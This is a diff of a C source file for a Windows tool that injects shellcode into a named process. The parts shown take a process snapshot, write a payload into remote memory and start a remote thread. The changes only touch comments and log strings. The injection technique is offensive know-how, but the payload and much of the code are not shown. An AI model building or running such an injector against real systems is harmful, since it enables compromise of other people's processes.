@@ -7,11 +7,13 @@
 
 /**
 * Injects shellcode into a process
-*
+* Supports 32- and 64 Bit applications.
+* [Warning] - The current implementation crashes the target process after executing the shellcode
 */
 int main(int argc, char* argv[])
 {
 	const char* processName;
+
 	if (argc != 2)
 	{
 		printf("Usage: *.exe processName\n");
@@ -19,6 +21,8 @@ int main(int argc, char* argv[])
 	}
 
 	processName = argv[1];
+
+	printf("[Info] - Injecting shellcode into %s\n", processName);
 
 	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
 	if (processesSnapshot == INVALID_HANDLE_VALUE)
@@ -83,7 +87,7 @@ int main(int argc, char* argv[])
 		return 1;
 	}
 
-	printf("[Info] - Written payload to %p\n", remoteMemory);
+	printf("[Info] - Wrote payload to %p\n", remoteMemory);
 
 	// create a thread in the target process which loads the .dll
 	HANDLE hThread = CreateRemoteThread(
